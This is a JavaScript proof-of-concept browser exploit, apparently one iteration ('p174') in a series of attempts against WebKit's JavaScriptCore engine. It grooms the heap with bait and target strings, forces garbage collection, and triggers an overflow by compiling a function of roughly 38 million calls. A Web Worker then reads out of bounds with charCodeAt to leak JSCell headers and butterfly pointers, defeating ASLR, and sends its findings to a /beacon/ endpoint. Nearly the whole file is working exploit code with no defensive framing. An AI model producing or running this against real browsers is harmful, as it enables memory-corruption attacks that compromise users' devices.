// p174 — Structure ID / Butterfly Leak via OOB charCodeAt
//
// THEORY: If the metadata sweep corrupts a JSString's m_length to a value
// LARGER than the actual StringImpl buffer (100,000 bytes), charCodeAt can
// read OOB into adjacent MarkedSpace cells containing JSObjects.
//
// JSCell header layout (little-endian, 16 bytes):
//   Bytes 0-3:   StructureID (uint32, typically 1-10000)
//   Bytes 4-5:   IndexingType + Type flags
//   Bytes 6:     TypeInfo::InlineTypeFlags
//   Bytes 7:     CellState
//   Bytes 8-15:  Butterfly pointer (raw heap address)
//
// If we read a butterfly pointer, we know the heap base range (ASLR leak).
//
// SCAN STRATEGY:
//   1. Run p146 bait-and-switch (proven pattern)
//   2. For each corrupted string, check .length
//   3. If .length > STR_LEN (100000): OOB read available
//      Scan OOB region for StructureID-like patterns (uint32 1-10000)
//   4. If .length < STR_LEN: scan within bounds for non-canary data
//      (metadata entry bytes overwriting string data may still leak info)
//   5. When a JSCell header candidate found, extract butterfly at +8
//
// Beacon prefix: V174-

(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V174-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  }
  function BP(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V174-' + tag + '?t=' + Date.now(), true);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body);
    } catch(e) {}
  }

  B('BOOT');

  // ── WORKER ──
  var workerCode = function() {
    var targets = [];
    var baseUrl = '';
    var STR_LEN = 100000;
    var CANARY = 0x41; // 'A'

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V174-W-' + tag + '?t=' + Date.now(), true);
        x.send();
      } catch(e) {}
    }
    function beaconPost(tag, body) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V174-W-' + tag + '?t=' + Date.now(), true);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send(body);
      } catch(e) {}
    }
    function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    // Read 4 bytes as uint32 little-endian from string at offset
    function readU32(str, off) {
      try {
        var b0 = str.charCodeAt(off);
        var b1 = str.charCodeAt(off + 1);
        var b2 = str.charCodeAt(off + 2);
        var b3 = str.charCodeAt(off + 3);
        if (b0 !== b0 || b1 !== b1 || b2 !== b2 || b3 !== b3) return -1; // NaN check
        return (b0 | (b1 << 8) | (b2 << 16) | ((b3 << 24) >>> 0)) >>> 0;
      } catch(e) { return -1; }
    }

    // Read 8 bytes as hex string (little-endian display) from string at offset
    function readHex8(str, off) {
      var hex = '';
      for (var i = 7; i >= 0; i--) {
        try {
          var v = str.charCodeAt(off + i);
          if (v !== v) { hex += 'XX'; continue; } // NaN
          hex += hx(v);
        } catch(e) { hex += 'XX'; }
      }
      return hex;
    }

    // Read N bytes as raw hex (byte order preserved)
    function readRawHex(str, off, n) {
      var hex = '';
      for (var i = 0; i < n; i++) {
        try {
          var v = str.charCodeAt(off + i);
          if (v !== v) { hex += 'XX'; break; }
          hex += hx(v);
        } catch(e) { hex += 'XX'; break; }
      }
      return hex;
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'alloc') {
        // Exact p156 pattern: 14 strings of 100K 'A' chars
        var chunk = '';
        for (var k = 0; k < 100; k++) chunk += 'AAAAAAAAAA'; // 1000 chars
        for (var i = 0; i < 14; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) s += chunk;
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0); // force materialization
          targets.push(s);
        }
        beacon('TARGETS-' + targets.length);
        self.postMessage({ ready: true });
        return;
      }
      if (e.data.cmd === 'watch') {
        beacon('WATCHING');

        // ── DETECT CORRUPTION (busy loop, proven fast) ──
        var found = false;
        var iters = 0;
        while (!found) {
          for (var i = 0; i < targets.length; i++) {
            if (targets[i].length !== STR_LEN) {
              found = true;
              break;
            }
            // Also check charCodeAt canary
            try {
              var c8 = targets[i].charCodeAt(8);
              if (c8 !== CANARY) { found = true; break; }
            } catch(e) { found = true; break; }
          }
          iters++;
          if (iters % 500000 === 0) beacon('POLL-' + iters);
        }

        beacon('CORRUPTED-iter=' + iters);

        // ── SCAN ALL STRINGS ──
        var oobCount = 0;
        var candidateCount = 0;

        for (var i = 0; i < targets.length; i++) {
          var len;
          try { len = targets[i].length; } catch(e) { beacon('ERR-' + i); continue; }

          if (len === STR_LEN) {
            // Check if data is corrupted even with intact length
            try {
              if (targets[i].charCodeAt(8) === CANARY &&
                  targets[i].charCodeAt(24) === CANARY &&
                  targets[i].charCodeAt(56) === CANARY) continue; // clean
            } catch(e) { continue; }
          }

          beacon('S' + i + '-len=' + len);

          // ── CASE 1: OOB READ (.length > original allocation) ──
          if (len > STR_LEN) {
            oobCount++;
            beacon('OOB-' + i + '-extra=' + (len - STR_LEN));

            // Scan OOB region for JSCell headers (StructureID candidates)
            // Scan in 8-byte steps (JSCell alignment) from STR_LEN to min(len, STR_LEN + 8192)
            // Limit scan to avoid crashing on unmapped pages
            var scanEnd = Math.min(len, STR_LEN + 8192);
            var candidates = [];

            for (var off = STR_LEN; off + 16 <= scanEnd; off += 8) {
              try {
                var sid = readU32(targets[i], off);
                if (sid < 1 || sid > 10000) continue;

                // StructureID candidate found! Check flag bytes for reasonableness
                var flags = readU32(targets[i], off + 4);
                var flagByte4 = (flags & 0xFF);       // IndexingType
                var flagByte5 = (flags >> 8) & 0xFF;  // Type
                var flagByte6 = (flags >> 16) & 0xFF;  // InlineTypeFlags
                var flagByte7 = (flags >> 24) & 0xFF;  // CellState

                // CellState should be 0 (NewWhite) or 1 (OldWhite) or 2 (OldGrey) or 3 (OldBlack)
                if (flagByte7 > 3) continue;

                // IndexingType: common values are 0-7 or with ArrayClass bit
                // Be permissive here, just exclude 0xFF
                if (flagByte4 === 0xFF) continue;

                // We have a plausible JSCell header
                candidates.push({
                  off: off,
                  sid: sid,
                  flags: flags
                });

                // Extract butterfly pointer at +8 (8 bytes, little-endian hex)
                var bflyHex = readHex8(targets[i], off + 8);

                beacon('SID-' + i + '-off=' + off + '-id=' + sid);
                beacon('FLAGS-' + i + '-' + hx(flagByte4) + '-' + hx(flagByte5) + '-' + hx(flagByte6) + '-' + hx(flagByte7));
                beacon('BFLY-' + i + '-' + bflyHex);

                // Also dump raw 16 bytes of the header
                beacon('HDR-' + i + '-' + readRawHex(targets[i], off, 16));

                candidateCount++;
                if (candidateCount >= 20) break; // limit beacon flood
              } catch(e) {
                beacon('SCANERR-' + i + '-off=' + off);
                break; // likely hit unmapped memory
              }
            }

            if (candidates.length === 0) {
              // No StructureID candidates found in aligned scan
              // Try dumping first 64 OOB bytes raw for analysis
              beacon('NOCANDIDATE-' + i);
              var raw = readRawHex(targets[i], STR_LEN, Math.min(64, len - STR_LEN));
              beaconPost('OOBRAW-' + i, raw);
            }
          }

          // ── CASE 2: WITHIN-BOUNDS SCAN (always, for non-canary data) ──
          // Scan first 2000 bytes for non-canary values (metadata entry data)
          var scanMax = Math.min(len, 2000);
          if (scanMax <= 0) continue;

          var firstNonCanary = -1;
          for (var b = 0; b < scanMax; b++) {
            try {
              if (targets[i].charCodeAt(b) !== CANARY) {
                firstNonCanary = b;
                break;
              }
            } catch(e) { break; }
          }

          if (firstNonCanary >= 0) {
            beacon('NC-' + i + '-off=' + firstNonCanary);

            // Dump 112 bytes from entry start (full metadata entry)
            var entryHex = readRawHex(targets[i], firstNonCanary, Math.min(112, scanMax - firstNonCanary));
            beaconPost('ENTRY-' + i, entryHex);

            // Check if any non-canary 4-byte window looks like a StructureID
            for (var w = firstNonCanary; w + 16 <= scanMax; w += 4) {
              try {
                var val = readU32(targets[i], w);
                if (val >= 1 && val <= 10000) {
                  var cs = (readU32(targets[i], w + 4) >> 24) & 0xFF;
                  if (cs <= 3) {
                    beacon('INSID-' + i + '-off=' + w + '-id=' + val);
                    beacon('INBFLY-' + i + '-' + readHex8(targets[i], w + 8));
                    beacon('INHDR-' + i + '-' + readRawHex(targets[i], w, 16));
                  }
                }
              } catch(e) { break; }
            }
          }
        }

        beacon('SUMMARY-oob=' + oobCount + '-cand=' + candidateCount);
        beacon('DONE');
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: BASE });

  // ── PHASE 1: BAIT STRINGS (exact p156 pattern) ──
  var N_BAIT = 20;
  var STR_LEN = 100000;
  B('BAIT-START');
  var baits = [];
  var baitChunk = '';
  for (var k = 0; k < 100; k++) baitChunk += 'BBBBBBBBBB'; // 1000 B chars
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) bait += baitChunk;
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0); // force materialization
    baits.push(bait);
  }
  baitChunk = null;
  B('BAIT-DONE-' + N_BAIT);

  // ── PHASE 2: WORKER ALLOCATES TARGETS ──
  worker.onmessage = function(e) {
    if (e.data.ready) phaseFreeBaits();
  };
  B('WORKER-ALLOC');
  worker.postMessage({ cmd: 'alloc', count: 14 });

  // ── PHASE 3: FREE BAITS + GC PRESSURE ──
  function phaseFreeBaits() {
    B('FREE-START');
    for (var i = 0; i < baits.length; i++) baits[i] = null;
    baits = null;

    var gcRound = 0;
    function gcPressureRound() {
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(gcRound);
      gcRound++;
      if (gcRound < 30) setTimeout(gcPressureRound, 30);
      else { B('GC-DONE-' + gcRound); phaseBuild(); }
    }
    gcPressureRound();
  }

  // ── PHASE 4: BUILD + CALL OVERFLOW ──
  function phaseBuild() {
    B('BUILD-START');
    var N = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N / CHUNK);
    var REM = N - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v174fn=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v174ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');
    callChunk = null;
    remChunk = null;
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMPILED-' + (window.__v174ok ? 'OK' : 'FAIL'));
      if (!window.__v174fn) { B('NO-FN'); return; }

      // Start worker polling, then trigger overflow
      worker.postMessage({ cmd: 'watch' });

      setTimeout(function() {
        B('CALLING');
        try {
          window.__v174fn(function(){});
        } catch(ex) {
          B('CATCH-' + (ex.message || '').substring(0, 30));
        }
        B('SURVIVED');
      }, 200);
    };

    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
